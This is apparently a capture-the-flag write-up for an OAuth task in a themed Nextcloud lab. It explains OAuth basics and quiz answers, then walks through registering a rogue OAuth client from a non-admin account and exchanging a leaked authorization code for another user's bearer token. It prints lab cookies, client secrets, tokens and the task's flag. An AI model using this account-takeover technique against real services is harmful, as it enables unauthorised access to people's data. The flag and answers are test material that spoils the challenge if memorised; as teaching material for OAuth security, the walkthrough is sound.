[🢁](../README.md) &nbsp;
[🢀](../7%20Twardowski/README.md) &nbsp;Task 8&nbsp;
[🢂](../9%20End%20of%20the%20journey/README.md)

# Popiel

**☆ Popiel (Managing Director) ☆**

>As a former king, Popiel brings a wealth of political experience to the team. He is a shrewd strategist who is well-versed in the ways of diplomacy and negotiation. Popiel's expertise is particularly valuable when it comes to navigating the complicated relationships between the Midsummer Corp and the various factions that are interested in the fern flower. 


# Description

To succeed in your final hack, you need to become familiar with the OAuth 2.0 authorization framework. This standard allows a user to grant a third-party application access to the user's protected resources. The best part is that the application does not know the user's credentials. 

**How does OAuth work?**

To get started and understand basic terminology, watch the OAuth portion of the [video](https://www.youtube.com/watch?v=t18YB3xDfXI). 

As you already know, there are 4 roles in the OAuth flow: 

- Resource Owner
- Resource Server
- Client
- Authorization Server

Flows have different types, called grant types. The most popular is the Authorization Code flow. You can find the nitty-gritty details, including the structure of HTTP requests, [in the blog post](https://developer.okta.com/blog/2018/04/10/oauth-authorization-code-grant-type). 

Before any flow can take place, a Client and an Authorization Server must establish a trust relationship. This step is called registration, and as a result, a client receives an identifier, called client_id, and a secret value, called client_secret. 

**Common OAuth issues**

<u>1. Missing recommended properties of an authorization code</u>

The purpose of the authorization code is to exchange it for an access token. Current guidelines list the following preferred properties: 

- The authorization code should be a one-time-use. 
- The authorization code should expire shortly (3-5 minutes is best) after it is issued by the Authorization Server. 
- The authorization code should be bound to a single Client.
- The authorization code should be transmitted securely over a TLS connection. 

These properties help ensure the security of the Authorization Code Flow by minimizing the window of opportunity for an attacker to intercept and misuse the authorization code. Unfortunately, many implementations do not follow them. 

<u>2. Open registration of new OAuth clients</u>

Registration of new OAuth Clients should be restricted. This ensures that only legitimate and trustworthy applications are granted access to user data. With a new Client verification process in place, it will be more difficult for an attacker to trick the victim into agreeing to access their data.  


# Tasks

**Prerequisites**: Access to twardowski account. 

**Your objective**: You should already be in possession of a leaked authorization code. It is a result of an OAuth flow initiated by one of the Popiel's advisory applications. Your task is to exchange it for an access token and access a former king's resources. Best of luck! 


# Answer the questions below

## 1. The NextCloud application plays two OAuth roles at once. Which ones?

Answer format: `************* ******, ******** ******`

Answer: `authorization server, resource server`

Answered in linked video. Alternatively we can take four roles mentioned in description, and count letters. 

```
- Resource Owner
- Resource Server
- Client
- Authorization Server
```

`Authorization Server` is the only one fitting as first role. For the second there is only `Resource Owner` and `Resource Server` to try.

## 2. What value of the response_type parameter indicates that an application is starting the authorization code flow?

Answer format: `****`

Answer: `code`

In linked blog post we can read:

```
response_type=code - This tells the authorization server that the application is initiating the authorization code flow
```

## 3. During registration, each client receives a unique pair of client_id and client_secret. (Y/N)

Answer format: `*`

Answer: `Y`

Easy to guess as there are only two options, but can be also read in linked blog post:

```
Exchange the Authorization Code for an Access Token

We’re about ready to wrap up the flow. Now that the application has the authorization code, it can use that to get an access token.

The application makes a POST request to the service’s token endpoint with the following parameters:

- ...
- client_id - The application’s client ID.
- client_secret - The application’s client secret. This ensures that the request to get the access token is made only from the application, and not from a potential attacker that may have intercepted the authorization code.
```

## 4. What endpoint you should use to exchange the OAuth code for a token?

Answer format: `/****/******/***/**/*****`

Answer: `/apps/oauth2/api/v1/token`

Can be found in source code using regex:

```[^/]/..../....../.../../.....[^/]```

Where `/` means `/` character and `.` means any character. Symbols `[^/]` at the start and the end mean negation of the `/` character in order to exclude `///////////` comments from showing up, but are not needed.

## 5. What is the content of the Fern_flower_ritual_shard6.txt file in Popiel's account?

Answer format: `**************{***********************************************}`

Answer: `Midsummer_Corp{Spr1nkle_wat3r_fr0m_a_s@cr3d_spr1ng_0n_th3_fern}`

On Twardowski's account we are given two important files. First one is `authorization_code.txt` with code:

```Oz5xWmb0pCQEZJp6puQQoSKuM1JK9jczqe3CLKqvl0VuFM7VsWJFqMU6CF0T0ipdOtmy8lkRPIsz0PoWSTbf2gTLx86NZ7YYIY6pZ0Sj8nP6kcQY2uUFRVhxzmAhudrR```

Second one is [supportticket_draft.txt](./supportticket_draft.txt) with his instructions about what to do.

Before we can exchange OAuth code for token we need to obtain `client_id` and `client_seret`. From Twardowski's message we discover, that he tried to do it by sending POST to endpoint `/apps/oauth2/clients` with cookies:

```
ocqpfobax3l0=ea40d3c44aebc7c3d2d060ce0c74f7c4; oc_sessionPassphrase=mzJr4dxugNOXA34YgaivUEgs8P4p%2BEju7qBoC87qZ9S4Cu2lUGAo50U3HiuEw3CAfGgusiTSBSMA8s03rgJY0PcVgGbGJEbyNKV3EdvhxL5lXP83qw8xjBQM6qTj083j; nc_sameSiteCookielax=true; 
nc_sameSiteCookiestrict=true; nc_username=admin; nc_token=RhnpFe88vZTezlB9J0FmEj9S4lrX%2FLyl; nc_session_id=ea40d3c34aebb7c3d2d060ce0c74f7c4
```

And `Content-Type: application/json` data:

```json
{
    "name":"alchemy-mixer-ng",
    "redirectUri":"https://alchemy-mixer-ng.ctf/auth/callback"
}
```

If we replicate it, response is `Current user is not logged in`. Disabling cookies does the same, so this session is probably expired and will be of no use to us. Nevertheless we need to initialize oauth2 flow which should require admin rights.

I wanted to know more, so I searched for `/apps/oauth2/clients` in source code. This endpoint does not show up, but after some more time I got to `apps/oauth2/appinfo/routes.php` file with `/clients` route directing to `Settings#addClient`. `addClient` function can be found in `apps/oauth2/lib/Controller/SettingsController.php` and has very helpful annotation above

```php
/**
 * @NoAdminRequired
 */
```

Knowing that user does not need to be the admin, we can use any other account, for example Puck. After logging let's repeat steps from [Task 6](../6%20Boruta/README.md) and create app password, to copy `Requesttoken` to request header in Postman. To not have to copy cookies one by one, I also took them from this headers and set them in Postman.

To sum up, we need to send request to `http://MACHINE_IP/apps/oauth2/clients`. Body will be:

```json
{
    "name":"alchemy-mixer-ng",
    "redirectUri":"https://alchemy-mixer-ng.ctf/auth/callback"
}
```

Headers must contain `Cookie` with browser cookies and `Requesttoken` obtained earlier.

In response we get:

```json
{
    "id": 2,
    "name": "alchemy-mixer-ng",
    "redirectUri": "https://alchemy-mixer-ng.ctf/auth/callback",
    "clientId": "PKFINjh9Xsr791tQAiCP0QMEqxjxIBZiV4IuvIoIZQ7JPjnfebXiFRM3AMZjkDdE",
    "clientSecret": "ZaM40hhUd4CCMgYRaIdNMdtZL5sHxHvs9BpZ3uIhWRS4fybhRGGIbaojfGfYjLO4"
}
```

We have `clientId` and `clientSecret`, so it's time to exchange code to token. Enpoint will be `/apps/oauth2/api/v1/token`, as described in [Step 4](#4-what-endpoint-you-should-use-to-exchange-the-oauth-code-for-a-token).

Blog post from description explains which data we need to include:

```
- grant_type=authorization_code
- code
- redirect_uri
- client_id
- client_secret
```

`grant_type` is already there

`code` can be taken from `authorization_code.txt`

`redirect_uri` is the same as before

Our final payload looks like this:

```json
{
    "grant_type": "authorization_code",
    "code": "Oz5xWmb0pCQEZJp6puQQoSKuM1JK9jczqe3CLKqvl0VuFM7VsWJFqMU6CF0T0ipdOtmy8lkRPIsz0PoWSTbf2gTLx86NZ7YYIY6pZ0Sj8nP6kcQY2uUFRVhxzmAhudrR",
    "redirect_uri": "https://alchemy-mixer-ng.ctf/auth/callback",
    "client_id": "PKFINjh9Xsr791tQAiCP0QMEqxjxIBZiV4IuvIoIZQ7JPjnfebXiFRM3AMZjkDdE",
    "client_secret": "ZaM40hhUd4CCMgYRaIdNMdtZL5sHxHvs9BpZ3uIhWRS4fybhRGGIbaojfGfYjLO4"
}
```

At first I used `camelCase` instead of `snake_case` for client id and secret like in response we got, but server then returns a 500 error. `snake_case` is used in source code and blog post and is a correct way to send client id and secret.

Sending it to `http://MACHINE_IP/apps/oauth2/api/v1/token` returns:

```json
{
    "access_token": "aHWFm3p3eRyOMTz45kDyhNX9EqGkEPz1dbkH7SFxhhDPB9WIaamQRtaWhbpC0AadpTO6lcAh",
    "token_type": "Bearer",
    "expires_in": 3600,
    "refresh_token": "Oz5xWmb0pCQEZJp6puQQoSKuM1JK9jczqe3CLKqvl0VuFM7VsWJFqMU6CF0T0ipdOtmy8lkRPIsz0PoWSTbf2gTLx86NZ7YYIY6pZ0Sj8nP6kcQY2uUFRVhxzmAhudrR",
    "user_id": "popiel"
}
```

We got `access_token` of type `Bearer` for Popiel. To utilize it I used [ModHeader](https://modheader.com/) extension again by adding header:

`Authorization: Bearer aHWFm3p3eRyOMTz45kDyhNX9EqGkEPz1dbkH7SFxhhDPB9WIaamQRtaWhbpC0AadpTO6lcAh`

After logging out of Puck's account we are logged in as Popiel.